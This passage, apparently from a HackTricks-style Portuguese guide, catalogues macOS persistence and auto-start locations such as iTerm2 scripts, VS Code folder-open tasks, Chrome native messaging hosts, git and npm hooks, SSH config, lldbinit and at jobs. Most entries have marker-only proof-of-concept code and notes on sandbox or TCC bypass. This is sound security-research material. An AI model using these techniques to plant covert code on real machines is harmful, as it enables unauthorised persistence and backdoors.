ls -ld /usr/lib/cron/tabs
```

Em uma conta descartável, é possível instalar uma entrada cron de usuário contendo apenas um marcador com `crontab` e removê-la após observá-la. Executar `crontab <file>` **substitui todo o crontab existente da conta**, então salve-o e restaure-o se a conta não for descartável:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Relato: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Contorno de TCC: [✅](https://emojipedia.org/check-mark-button)
  - O iTerm2 costumava ter permissões TCC concedidas

#### Locais

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Acionador**: Iniciar o iTerm2 com um script da Python API elegível nessa pasta
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Acionador**: Iniciar o iTerm2; o hook de inicialização do AppleScript é documentado separadamente
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Acionador**: Criar uma sessão com o perfil cujo comando ou texto inicial invoca o payload

#### Descrição e exploração

O [guia atual da Python API do iTerm2](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) documenta scripts **Python** de execução automática em `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Ele não estabelece que um arquivo `.sh` executável arbitrário nessa pasta seja executado. Em uma conta descartável, salve isto como `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

O [guia atual de AppleScript do iTerm2](https://iterm2.com/documentation-scripting.html) documenta separadamente `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, com uma alternativa legada `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` quando a pasta moderna não existe. Um AppleScript que contém apenas um marcador é:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Esses exemplos de script foram verificados em relação à documentação do iTerm2, mas não foram executados na sessão ativa da área de trabalho. Após testar em uma conta descartável, remova o script de teste e `/tmp/ht-iterm-autolaunch-marker` ou `/tmp/iterm2-autolaunchscpt`, respectivamente.

As preferências do iTerm2 localizadas em **`~/Library/Preferences/com.googlecode.iterm2.plist`** podem especificar um comando de perfil ou texto inicial. O último é digitado em uma sessão; sua execução depende de um shell interpretá-lo. A [documentação de perfis do iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) descreve o comando executado quando uma nova sessão com esse perfil é criada.

Essa configuração pode ser definida nas configurações do iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E o comando aparece refletido nas preferências:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Para uma avaliação segura, inspecione o perfil escolhido nas configurações do iTerm2 ou leia uma cópia do arquivo de preferências. Alterar `Initial Text` em um perfil ativo afetaria as sessões de um usuário, então nenhuma preferência foi alterada no Mac usado para a pesquisa.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas o xbar precisa estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ele solicita permissões de Acessibilidade

#### Localização

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Acionamento**: Quando o xbar é executado

#### Descrição

Se o popular programa [**xbar**](https://github.com/matryer/xbar) estiver instalado, é possível escrever um shell script em **`~/Library/Application\ Support/xbar/plugins/`** que será executado quando o xbar for iniciado:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas o Hammerspoon precisa estar instalado
- Contorno do TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ele solicita permissões de Acessibilidade

#### Localização

- **`~/.hammerspoon/init.lua`**
  - **Gatilho**: Quando o hammerspoon é executado

#### Descrição

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funciona como uma plataforma de automação para **macOS**, usando a **linguagem de script LUA** em suas operações. Notavelmente, oferece suporte à integração de código AppleScript completo e à execução de shell scripts, ampliando significativamente seus recursos de script.<sup>[[13]](#references)</sup>

O app procura um único arquivo, `~/.hammerspoon/init.lua`, e, quando iniciado, o script é executado.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas o BetterTouchTool precisa estar instalado
- Desvio de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ele solicita permissões de Automation-Shortcuts e Accessibility

#### Localização

- Um arquivo de script **já referenciado** por um preset habilitado do BetterTouchTool, ou a configuração desse preset em `~/Library/Application Support/BetterTouchTool/`. O caminho exato do script depende de como o preset foi configurado.

A [referência de ações do BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) documenta ações de script de shell e de comando em segundo plano. O evento configurado de teclado, mouse, touch, widget ou outro deve ocorrer enquanto o preset relevante estiver ativo; [o guia de acionadores](https://docs.folivora.ai/docs/configuration/new-trigger/) mostra essa associação. Um arquivo aleatório no diretório de suporte do aplicativo não é um acionador. Uma ação já configurada que carrega um script externo gravável é um alvo mais específico de gravação para execução. O código é executado com a conta do usuário do BetterTouchTool, sujeito às permissões reais concedidas pelo macOS. O BetterTouchTool não estava em `/Applications` no Mac usado para a pesquisa, então nenhum preset foi alterado ou executado localmente.

### Alfred

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas o Alfred precisa estar instalado
- Desvio de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ele solicita permissões de Automation, Accessibility e até Full-Disk access

#### Localização

- Um script ou arquivo **já referenciado** por um workflow instalado do Alfred, ou esse workflow no diretório `Alfred.alfredpreferences` configurado pelo usuário. O diretório de preferências pode ser sincronizado e não tem um caminho universal fixo.

O [guia de workflows do Alfred](https://www.alfredapp.com/help/workflows/) descreve o requisito do Powerpack e a instalação pela interface do usuário. O hotkey, a keyword ou outro acionador configurado de um workflow instalado precisa ser acionado; [o exemplo de hotkey do Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) demonstra uma ação de script. A [referência de ambiente do Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) disponibiliza o caminho de preferências selecionado como `alfred_preferences`. Soltar um arquivo de workflow não registrado em um diretório aleatório não comprova que ele será instalado ou executado. O código é executado como o usuário conectado do Alfred, com as permissões reais concedidas pelo macOS. O Alfred não estava em `/Applications` no Mac usado para a pesquisa, então esse caminho foi avaliado apenas com base na documentação.

### Comandos de script do Raycast e atualização de extensões

- **Alvo de gravação:** Um script executável em um diretório **já adicionado** em Raycast Settings → Script Commands. O Raycast não verifica um diretório recém-criado qualquer. O [guia de Script Commands do Raycast](https://manual.raycast.com/script-commands) documenta o registro do diretório.
- **Acionador e identidade:** Um usuário invoca o comando indexado, um hotkey ou fallback configurado o invoca, ou o Raycast atualiza um script `inline` de acordo com o `@raycast.refreshTime` configurado. O script é executado como o usuário conectado do Raycast, por meio do interpretador. A [referência de metadados upstream](https://github.com/raycast/script-commands#metadata) limita a atualização automática a comandos inline, e o [manifesto de extensões do Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) também oferece suporte a um `interval` para comandos de extensões instaladas do tipo `no-view` ou `menu-bar`. Apenas adicionar um comando de script normal não o agenda.

Para uma conta descartável com um diretório de scripts registrado, um script inline que apenas cria um marcador é:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Salve-o no diretório registrado, torne-o executável e permita que o Raycast o atualize. Em seguida, remova esse arquivo e `/tmp/ht-raycast-refresh-marker`. O Raycast não foi encontrado com o nome usual em `/Applications` no Mac de pesquisa, portanto, isto está documentado em fontes e não foi executado localmente. As permissões de Acessibilidade, Automação e acesso a arquivos continuam sujeitas aos avisos de permissão do macOS.

### Tarefas automáticas de workspace do Visual Studio Code

- **Destino da gravação:** `.vscode/tasks.json` dentro de um workspace que o usuário abrirá.
- **Gatilho:** Abrir esse workspace no VS Code, mas somente se a pasta for confiável **e** as tarefas automáticas tiverem sido permitidas. Um workspace não confiável nunca executa tarefas automáticas; a configuração padrão solicita a confirmação do usuário antes da primeira execução automática. A [documentação de tarefas do VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) e a [documentação de Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) descrevem ambos os requisitos.
- **Identidade de execução:** A conta do usuário do VS Code, por meio do processo de tarefa configurado. Essa execução é específica do aplicativo, não é persistência no login.

Em um **workspace novo e descartável**, coloque esta tarefa que apenas cria um marcador em `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Depois de abrir o workspace confiável e permitir tarefas automáticas, verifique se `.autostart-task-ran` existe. Remova a entrada da tarefa e o marcador para limpar tudo. **Isso foi verificado com base na documentação da Microsoft e no bundle instalado do VS Code 1.139.1; não foi executado na sessão ativa da área de trabalho.**

### Hosts de native messaging do Chrome

- **Destino de gravação:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` para o usuário atual ou `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` para todos os usuários (requer permissão de gravação de administrador). Chromium e Chrome for Testing usam diretórios diferentes; consulte a [tabela de caminhos atual do Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Acionamento:** Uma extensão instalada do Chrome com a permissão `nativeMessaging` chama `chrome.runtime.connectNative()` ou `chrome.runtime.sendNativeMessage()` usando o nome exato do host no manifesto. O Chrome inicia então o executável do host. Abrir o Chrome, por si só, não executa um novo host native arbitrário; criar um manifesto sem uma extensão que o invoque não faz nada. O [guia de native messaging do Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) documenta essa interação.
- **Identidade de execução:** A conta do usuário do Chrome. O manifesto deve especificar um caminho absoluto para o executável e permitir explicitamente a origem da extensão que o invoca.

Em uma conta de navegador descartável com uma extensão de teste, o par de arquivos a seguir demonstra o vínculo entre gravação e execução. O nome do arquivo do manifesto deve corresponder ao valor de `name`, e `TEST_EXTENSION_ID` deve ser substituído pelo ID real dessa extensão:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Salve este JSON como `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. O executável que serve apenas como marcador no `path` do manifesto pode conter:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Depois que a extensão de teste chamar `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` no service worker ou na página da extensão, o marcador comprova que o host foi iniciado. Este host mínimo não implementa o protocolo de resposta do Chrome com prefixo de comprimento, então a extensão pode informar um erro de mensagens após a gravação do marcador. Remova o manifesto de teste, o host e o marcador para limpar tudo. No macOS 26.5.2, o app Chrome e ambos os diretórios de manifestos estavam presentes; **o perfil ativo do Chrome não foi modificado nem utilizado**.

### Comandos de eventos de tecla do Karabiner-Elements

- **Alvo de gravação:** `~/.config/karabiner/karabiner.json` em uma conta onde o Karabiner-Elements está instalado e em execução. [O guia de localização de arquivos do Karabiner](https://karabiner-elements.pqrs.org/docs/json/location/) informa que o app monitora e recarrega esse arquivo após uma gravação. Arquivos JSON em `assets/complex_modifications` são apenas predefinições importáveis; gravar um arquivo ali não ativa uma regra.
- **Gatilho:** O evento de tecla configurado após a ativação da regra. A [referência de `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) documenta a execução de comandos. Isso não é execução de código no login nem a cada gravação de arquivo.
- **Identidade de execução:** O usuário conectado que executa o processo do usuário do Karabiner. As permissões concedidas a ele e qualquer acesso TCC dependem do app e da versão.

Em uma conta de teste descartável, adicione este objeto de regra ao array `complex_modifications.rules` do perfil selecionado em `karabiner.json`, preservando o restante desse perfil. Pressione F18 para criar um marcador inofensivo e, em seguida, remova essa regra e o marcador. Escolher F18 evita substituir uma tecla de digitação comum:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

O Karabiner-Elements não estava instalado em `/Applications` na máquina de teste com macOS 26.5.2, portanto este é um PoC respaldado por documentação, e não um resultado de execução local.

### Git hooks em um repositório local

- **Alvo de gravação:** um hook executável, como `<repo>/.git/hooks/post-checkout`. Se `core.hooksPath` já tiver sido definido, use o diretório configurado. Um hook commitado como um arquivo-fonte comum rastreado não é instalado automaticamente em um clone.
- **Acionamento:** a operação correspondente do Git. Por exemplo, `post-checkout` é executado após `git checkout` ou `git switch`, e também pode ser executado após a criação de um clone ou worktree. [A referência de hooks do Git](https://git-scm.com/docs/githooks) lista os eventos e o requisito do bit executável; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) altera o diretório de busca.
- **Identidade de execução:** a conta que executa o Git. O hook só pode ser executado se o diretório de hooks efetivo do repositório permitir gravação pelo agente e se o usuário realizar posteriormente a operação Git relevante.

Este PoC, que apenas cria um marcador, cria um repositório totalmente descartável, instala um hook e troca de branch. Foi executado com sucesso usando o Apple Git 2.50.1 no macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Scripts de ciclo de vida do npm em um projeto

- **Alvo de escrita:** O mapa `scripts` em `package.json` de um projeto gravável, ou um pacote de dependência instalado cujo script de ciclo de vida será executado pelo usuário. Este é um hook do fluxo de trabalho de desenvolvimento, não uma execução ao abrir um diretório.
- **Gatilho e identidade:** Um `npm install` ou `npm ci` posterior, com scripts de ciclo de vida permitidos, executa `preinstall`, `install` e `postinstall` como o usuário que invocou o npm. Um `npm run <name>` comum também executa os scripts correspondentes `pre<name>` e `post<name>`. [A referência de ciclo de vida do npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) lista os eventos; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) pode suprimir os scripts de ciclo de vida da instalação. A versão e as configurações de política podem alterar o que é permitido, portanto, verifique a versão do npm no alvo.

Esta PoC que apenas cria um marcador foi executada com o npm local em um diretório vazio e descartável. Ela não baixa dependências nem altera o projeto de um usuário:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Isso é diferente dos arquivos de inicialização do interpretador Python: o npm precisa executar a ação de instalação ou execução relevante, enquanto o código `site` do Python pode ser carregado em uma chamada comum do interpretador. Alvos genéricos de `Makefile` e definições de tarefas de build também exigem que o usuário ou uma ferramenta já configurada invoque esse alvo; não são caminhos separados de inicialização automática do sistema operacional.

### Configuração de inicialização do Vim

- **Alvo de gravação:** `~/.vimrc` para o usuário que iniciará o Vim (ou outro arquivo de inicialização selecionado pela ordem de inicialização do Vim). [A referência de inicialização do Vim](https://vimhelp.org/starting.txt.html) documenta o arquivo e as substituições `VIMINIT`/`EXINIT`.
- **Gatilho:** Uma inicialização comum subsequente do Vim que carregue essa configuração. A opção `-u NONE` do Vim ignora o vimrc do usuário. Essa execução é específica do editor, não um gatilho de login do sistema operacional.
- **Identidade de execução:** A conta do usuário do Vim.

A PoC isolada a seguir foi executada com o `/usr/bin/vim` do macOS; ela não grava preferências reais do Vim nem documentos abertos:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

O Neovim tem um caminho de configuração de usuário separado, `$XDG_CONFIG_HOME/nvim/init.lua` ou `init.vim`, e também carrega scripts nos diretórios de runtime `plugin/`, conforme sua [documentação de inicialização](https://neovim.io/doc/user/starting/). O Neovim não estava instalado na máquina de teste com macOS 26.5.2, então essa variante não foi executada nela.

### Comandos de configuração do cliente SSH

- **Alvo de gravação:** `~/.ssh/config` ou outro arquivo que ele já inclua. Este é um arquivo de configuração do **cliente**; é separado do arquivo do lado do servidor `~/.ssh/rc` descrito abaixo.
- **Acionamento:** Uma invocação de `ssh` correspondente. `Match exec` executa um comando local enquanto o cliente avalia sua configuração, inclusive com `ssh -G`, que exibe a configuração sem se conectar. `ProxyCommand` é executado quando o cliente estabelece uma conexão correspondente. `LocalCommand` é executado somente após uma conexão bem-sucedida e requer `PermitLocalCommand yes` (o padrão é `no`). Esses comandos têm tempos de execução e pré-requisitos diferentes; apenas gravar o arquivo não os executa. Consulte o [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) oficial.
- **Identidade de execução:** O usuário local que executa `ssh`. São necessários um host correspondente, um arquivo de configuração aplicável e qualquer conexão exigida. `ssh -F` pode selecionar outro arquivo de configuração.

Esta PoC apenas com marcador foi executada com o cliente SSH da Apple no macOS 26.5.2. `-G` testa `Match exec` sem estabelecer uma conexão de rede nem ler a configuração SSH real do usuário:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Arquivos de inicialização do debugger

- **Alvo de gravação:** `~/.lldbinit` ou o arquivo específico do aplicativo de prioridade mais alta, como `~/.lldbinit-lldb`. O LLDB lê um deles ao iniciar o debugger. Um `.lldbinit` no diretório atual **não** é executado por padrão; o usuário precisa habilitar `target.load-cwd-lldbinit` ou passar `--local-lldbinit`. Consulte o [manual do LLDB](https://lldb.llvm.org/man/lldb.html).
- **Acionamento e identidade:** O usuário inicia o LLDB sem `--no-lldbinit`; os comandos são executados como esse usuário. Simplesmente abrir um projeto não significa que o `.lldbinit` do projeto será executado.

O teste a seguir, que usa apenas um marcador, foi executado no LLDB no macOS 26.5.2, com um diretório home e um diretório de trabalho isolados:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, a [documentação upstream de inicialização](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) lista `$HOME/Library/Preferences/gdb/gdbinit` e depois `~/.gdbinit` no macOS. Um `.gdbinit` no diretório atual está sujeito ao [caminho seguro de carregamento automático](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), e `-nx`/`-nh` suprimem os arquivos de inicialização. O GDB não estava instalado no Mac de teste, portanto esta variante não foi executada localmente.

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas o SSH precisa estar habilitado e ser usado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Uso do SSH para obter acesso FDA

#### Localização

- **`~/.ssh/rc`**
  - **Gatilho**: Login via SSH
- **`/etc/ssh/sshrc`**
  - Requer root
  - **Gatilho**: Login via SSH

> [!CAUTION]
> Para ativar o SSH, é necessário ter acesso Full Disk:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Descrição e exploração

Por padrão, a menos que `PermitUserRC no` esteja definido em `/etc/ssh/sshd_config`, quando um usuário **faz login via SSH**, os scripts **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** serão executados.<sup>[[14]](#references)</sup>

### **Itens de início de sessão**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas é necessário executar `osascript` com argumentos
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localizações

- **Aplicativo auxiliar de item de início de sessão registrado:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (localização comum em pacotes).
  - **Acionamento:** O registro pode iniciar o auxiliar imediatamente; depois, ele inicia em logins posteriores do usuário, sujeito à aprovação.
- **Agente/daemon incluído e registrado:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` ou `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Acionamento:** Um agente aprovado pode iniciar no momento do registro e em logins posteriores; um daemon aprovado inicia na inicialização. Um daemon requer aprovação de administrador.

#### Descrição

Em **Ajustes do Sistema → Geral → Itens de Início de Sessão e Extensões**, os usuários podem revisar os itens de início de sessão e em segundo plano. O macOS 13 e versões posteriores oferecem [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) para registrar itens de início de sessão, agentes de inicialização e daemons de inicialização incluídos em pacotes. O [comportamento de `register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) varia conforme o tipo e o estado de aprovação. **Gravar um auxiliar em um pacote de aplicativo não basta para registrar um novo item de início de sessão.** Por outro lado, se o executável de um auxiliar já registrado tiver permissões de gravação, alterá-lo pode afetar sua próxima execução sem um novo registro; primeiro, verifique o caminho real e as verificações de assinatura de código.

A seguir está uma maneira somente de leitura para procurar auxiliares incluídos em pacotes em um Mac; ela não registra nem inicia nenhum deles:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Para um launch plist incluído no pacote, resolva `BundleProgram` **relativamente à raiz do pacote do app** (por exemplo, `Contents/MacOS/Helper`), conforme especifica a [orientação de migração do Service Management da Apple](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Um inventário somente leitura de `/Applications` no Mac de pesquisa encontrou 14 entradas de helper incluídas em pacotes e cinco declarações de `BundleProgram`; todos os cinco destinos foram resolvidos, e dois passaram por uma verificação de gravação pelo usuário. Essa verificação **não** comprova que qualquer um dos helpers esteja registrado, ativado, executável após a validação da assinatura ou acessível a um sandbox. `sfltool dumpbtm` listou 150 registros nomeados neste Mac; é um recurso de inspeção, não um teste para verificar se todos os registros estão em execução.

Itens de início de sessão mais antigos também podem ser gerenciados por meio de eventos da Apple. É possível listá-los, adicioná-los e removê-los pela linha de comando, embora adicioná-los altere a configuração persistente de início de sessão do usuário e possa exigir aprovação de Automação:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` é um detalhe de implementação, não um local com suporte para instalar um payload simplesmente gravando um arquivo. A API mais antiga `SMLoginItemSetEnabled` foi substituída por `SMAppService` para novos auxiliares; o caminho `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, mencionado anteriormente na página, não existia na máquina de teste com macOS 26.5.2. Use a API de registro e o estado da interface do sistema ao avaliar itens de início de sessão modernos, em vez de presumir um caminho para o banco de dados.

### ZIP como item de início de sessão

(Consulte a seção anterior sobre itens de início de sessão; isto é uma extensão)

Se você armazenar um arquivo **ZIP** como um **item de início de sessão**, o **`Archive Utility`** o abrirá. Se, por exemplo, o ZIP estiver armazenado em **`~/Library`** e contiver a pasta **`LaunchAgents/file.plist`** com um backdoor, essa pasta será criada (ela não existe por padrão) e o plist será adicionado. Assim, na próxima vez que o usuário iniciar sessão, o **backdoor indicado no plist será executado**.

Outra opção seria criar os arquivos **`.bash_profile`** e **`.zshenv`** no HOME do usuário. Assim, essa técnica ainda funcionaria se a pasta LaunchAgents já existisse.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas é necessário **executar** **`at`**, e ele precisa estar **habilitado**
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- É necessário **executar** **`at`**, e ele precisa estar **habilitado**

#### **Descrição**

As tarefas `at` são projetadas para **agendar tarefas únicas** para serem executadas em horários específicos. Ao contrário dos cron jobs, as tarefas `at` são removidas automaticamente após a execução. É importante observar que essas tarefas persistem após as reinicializações do sistema, o que as torna potenciais riscos de segurança em determinadas condições.<sup>[[16]](#references)</sup>

O `com.apple.atrun.plist` incluído tem `Disabled = true`, mas o launchd mantém separadamente as substituições efetivas de habilitado/desabilitado. Na máquina de teste com macOS 26.5.2, `launchctl print-disabled system` informou que `com.apple.atrun` estava **habilitado**, apesar dessa chave incluída. Verifique o estado efetivo antes de afirmar que os jobs `at` serão executados:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Um administrador pode habilitar um serviço `atrun` desativado com `launchctl`; o exemplo histórico a seguir altera o estado de um serviço do sistema e **não foi executado no Mac de pesquisa**:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Isso criará um arquivo em 1 hora:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Verifique a fila de tarefas usando `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Acima, podemos ver dois trabalhos agendados. Podemos exibir os detalhes do trabalho usando `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Se as tarefas AT não estiverem habilitadas, as tarefas criadas não serão executadas.

Os **arquivos de job** podem ser encontrados em `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

O nome do arquivo contém a fila, o número do job e o horário programado para execução. Por exemplo, vamos dar uma olhada em `a0001a019bdcd2`.

- `a` - esta é a fila
- `0001a` - número do job em hexadecimal, `0x1a = 26`
